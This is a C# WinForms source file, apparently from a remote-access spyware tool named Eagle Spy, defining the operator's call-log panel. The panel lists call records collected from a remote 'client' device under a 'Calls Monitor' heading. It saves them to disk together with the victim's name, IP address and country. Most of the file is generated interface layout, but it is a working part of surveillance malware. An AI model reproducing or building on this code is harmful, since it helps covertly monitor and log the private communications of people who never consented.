using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class CraxsCallLogs : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbutton")]
	private DrakeUIButtonIcon _checkbutton;

	public Client ClassClient;

	[field: AccessedThroughProperty("callstext")]
	internal TextBox callstext
    ;

    [field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
	;

	internal DrakeUIButtonIcon DrakeUIButtonIcon2
	;

	[field: AccessedThroughProperty("ToolTips")]
	internal DrakeUIToolTip ToolTips
        ;

	internal DrakeUIButtonIcon DrakeUIButtonIcon1
	;

	internal DrakeUIButtonIcon checkbutton
;

	[field: AccessedThroughProperty("Panel5")]
	internal Panel Panel5
    ;

    [field: AccessedThroughProperty("Panel4")]
	internal Panel Panel4
    ;

    [field: AccessedThroughProperty("Panel3")]
	internal Panel Panel3
    ;

    [field: AccessedThroughProperty("Panel2")]
	internal Panel Panel2
    ;

    [DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.callstext = new System.Windows.Forms.TextBox();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.checkbutton = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Panel5 = new System.Windows.Forms.Panel();
            this.Panel4 = new System.Windows.Forms.Panel();
            this.Panel3 = new System.Windows.Forms.Panel();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.ToolTips = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.Panel1.SuspendLayout();
            this.Panel5.SuspendLayout();
            this.SuspendLayout();
            // 
            // callstext
            // 
            this.callstext.BackColor = System.Drawing.Color.Black;
            this.callstext.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.callstext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.callstext.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.callstext.ForeColor = System.Drawing.Color.White;
            this.callstext.Location = new System.Drawing.Point(0, 0);
            this.callstext.Multiline = true;
            this.callstext.Name = "callstext";
            this.callstext.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.callstext.Size = new System.Drawing.Size(339, 216);
            this.callstext.TabIndex = 2;
            // 
            // Panel1
            // 
            this.Panel1.BackColor = System.Drawing.Color.Transparent;
            this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
            this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
            this.Panel1.Controls.Add(this.checkbutton);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel1.Location = new System.Drawing.Point(0, 0);
            this.Panel1.Margin = new System.Windows.Forms.Padding(2);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(365, 108);
            this.Panel1.TabIndex = 5;
            // 
            // DrakeUIButtonIcon2
            // 
            this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(240, 78);
            this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(2);
            this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
            this.DrakeUIButtonIcon2.Radius = 15;
            this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(54, 24);
            this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon2.Symbol = 61544;
            this.DrakeUIButtonIcon2.TabIndex = 3;
            this.ToolTips.SetToolTip(this.DrakeUIButtonIcon2, "Hide");
            this.DrakeUIButtonIcon2.Click += new System.EventHandler(this.DrakeUIButtonIcon2_Click);
            // 
            // DrakeUIButtonIcon1
            // 
            this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(182, 78);
            this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(2);
            this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
            this.DrakeUIButtonIcon1.Radius = 15;
            this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(54, 24);
            this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon1.StyleCustomMode = true;
            this.DrakeUIButtonIcon1.Symbol = 61639;
            this.DrakeUIButtonIcon1.TabIndex = 2;
            this.ToolTips.SetToolTip(this.DrakeUIButtonIcon1, "Save");
            this.DrakeUIButtonIcon1.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // checkbutton
            // 
            this.checkbutton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkbutton.FillColor = System.Drawing.Color.Black;
            this.checkbutton.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkbutton.Location = new System.Drawing.Point(298, 78);
            this.checkbutton.Margin = new System.Windows.Forms.Padding(2);
            this.checkbutton.Name = "checkbutton";
            this.checkbutton.Radius = 15;
            this.checkbutton.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.checkbutton.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.checkbutton.Size = new System.Drawing.Size(54, 24);
            this.checkbutton.Style = DrakeUI.Framework.UIStyle.Custom;
            this.checkbutton.Symbol = 61453;
            this.checkbutton.TabIndex = 1;
            this.ToolTips.SetToolTip(this.checkbutton, "Clear & Close");
            this.checkbutton.Click += new System.EventHandler(this.Checkbutton_Click);
            // 
            // Panel5
            // 
            this.Panel5.BackColor = System.Drawing.Color.Black;
            this.Panel5.Controls.Add(this.callstext);
            this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Panel5.Location = new System.Drawing.Point(13, 108);
            this.Panel5.Margin = new System.Windows.Forms.Padding(2);
            this.Panel5.Name = "Panel5";
            this.Panel5.Size = new System.Drawing.Size(339, 216);
            this.Panel5.TabIndex = 9;
            // 
            // Panel4
            // 
            this.Panel4.BackColor = System.Drawing.Color.Transparent;
            this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel4.Location = new System.Drawing.Point(13, 324);
            this.Panel4.Margin = new System.Windows.Forms.Padding(2);
            this.Panel4.Name = "Panel4";
            this.Panel4.Size = new System.Drawing.Size(339, 17);
            this.Panel4.TabIndex = 8;
            // 
            // Panel3
            // 
            this.Panel3.BackColor = System.Drawing.Color.Transparent;
            this.Panel3.Dock = System.Windows.Forms.DockStyle.Right;
            this.Panel3.Location = new System.Drawing.Point(352, 108);
            this.Panel3.Margin = new System.Windows.Forms.Padding(2);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(13, 233);
            this.Panel3.TabIndex = 7;
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Transparent;
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Left;
            this.Panel2.Location = new System.Drawing.Point(0, 108);
            this.Panel2.Margin = new System.Windows.Forms.Padding(2);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(13, 233);
            this.Panel2.TabIndex = 6;
            // 
            // ToolTips
            // 
            this.ToolTips.BackColor = System.Drawing.Color.Black;
            this.ToolTips.ForeColor = System.Drawing.Color.White;
            this.ToolTips.OwnerDraw = true;
            this.ToolTips.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // EagleSpyCallLogs
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.DarkRed;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.ClientSize = new System.Drawing.Size(365, 341);
            this.Controls.Add(this.Panel5);
            this.Controls.Add(this.Panel4);
            this.Controls.Add(this.Panel3);
            this.Controls.Add(this.Panel2);
            this.Controls.Add(this.Panel1);
            this.DoubleBuffered = true;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "EagleSpyCallLogs";
            this.Text = "Eaglecallslog";
            this.Panel1.ResumeLayout(false);
            this.Panel5.ResumeLayout(false);
            this.Panel5.PerformLayout();
            this.ResumeLayout(false);

	}

	public CraxsCallLogs()
	{
		base.Load += Craxscallslog_Load;
		base.Deactivate += Craxscallslog_Deactivate;
		InitializeComponent();
	}

	private void Craxscallslog_Load(object sender, EventArgs e)
	{
		base.Location = new Point(checked(Cursor.Position.X - 79), Cursor.Position.Y);
		BackColor = Color.DarkRed;
		base.TransparencyKey = Color.DarkRed;
		try
		{
			if (ClassClient != null)
			{
				if (ClassClient.CALLS.Count() > 0)
				{
					callstext.Text = "Calls Monitor...\r\nــــــــــــــــــــــ\r\n\r\n";
					string[] cALLS = ClassClient.CALLS;
					foreach (string text in cALLS)
					{
						try
						{
							if (text != null && text.Length > 0)
							{
								TextBox textBox;
								(textBox = callstext).Text = textBox.Text + text + "\r\nــــــــــــــــــــــ\r\n\r\n";
							}
						}
						catch (Exception)
						{
							//ProjectData.SetProjectError(projectError);
							//////CraxsAlert.Showinformation("Sorry");
						}
					}
				}
				else
					callstext.Text = "No New Calls...";
			}
			ClassClient.isnewcall = false;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError2);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void Checkbutton_Click(object sender, EventArgs e)
	{
		callstext.Text = "";
		ClassClient.CALLS = new string[251];
		Close();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(callstext.Text))
		{
			CraxsAlert.Showinformation("No log found to save");
			return;
		}
		try
		{
			if (!Directory.Exists(ClassClient.FolderUSER + "\\Calls_Log"))
				Directory.CreateDirectory(ClassClient.FolderUSER + "\\Calls_Log");
			string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
			if (!File.Exists(ClassClient.FolderUSER + "\\Calls_Log\\" + text))
			{
				File.Create(ClassClient.FolderUSER + "\\Calls_Log\\" + text).Dispose();
				File.AppendAllText(ClassClient.FolderUSER + "\\Calls_Log\\" + text, "Client Name: " + ClassClient.ClientName + "\r\nClient IP: " + ClassClient.ClientAddressIP + "\r\nCountry: " + ClassClient.Country + "\r\nDate :" + DateTime.Now.ToString() + "\r\n----------------------------------------\r\n");
			}
			File.AppendAllText(ClassClient.FolderUSER + "\\Calls_Log\\" + text, text + callstext.Text + "\r\n");
			Process.Start(ClassClient.FolderUSER + "\\Calls_Log");
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void Craxscallslog_Deactivate(object sender, EventArgs e)
	{
		Close();
	}
}
